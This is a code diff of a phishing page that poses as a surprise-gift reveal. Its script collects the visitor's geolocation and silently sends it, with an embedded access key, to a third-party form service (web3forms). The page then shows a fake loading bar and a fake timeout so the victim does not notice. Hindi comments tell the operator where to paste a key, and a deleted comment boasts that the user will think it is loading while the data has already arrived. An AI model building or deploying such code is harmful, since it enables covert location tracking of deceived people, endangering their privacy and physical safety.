@@ -1,28 +1,3 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Surprise Gift! 🎁</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        h1 { color: #e91e63; }
-        p { color: #555; line-height: 1.6; }
-        .btn { background: #e91e63; color: white; padding: 12px 25px; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn:hover { background: #c2185b; }
-        #loader { display: none; margin-top: 20px; color: #888; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <h1>You've Received a Gift! 🎁</h1>
-    <p>Someone special has sent you a surprise. To reveal your gift, please click the button below and allow access.</p>
-    <button class="btn" onclick="getLocation()">Reveal My Gift ✨</button>
-    <div id="loader">Processing your surprise... Please wait ⏳</div>
-</div>
-
 <script>
     function getLocation() {
         document.getElementById('loader').style.display = 'block';
@@ -36,7 +11,8 @@
     function sendData(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        // APNI KEY YAHAN DAALEIN
+        
+        // APNI KEY NICHE WALE QUOTES MEIN PASTE KAREIN
         const accessKey = "844d0d64-6348-457e-a68c-707bb563e54a"; 
 
         fetch("https://api.web3forms.com/submit", {
@@ -50,7 +26,6 @@
             })
         })
         .then(() => {
-            // User ko lagega load ho raha hai, lekin data aapko mil chuka hoga
             document.getElementById('loader').innerHTML = "Connecting to secure server... 95%";
             setTimeout(() => {
                 alert("Gift connection timed out. Please try again later.");
@@ -63,6 +38,3 @@
         document.getElementById('loader').style.display = 'none';
     }
 </script>
-
-</body>
-</html>
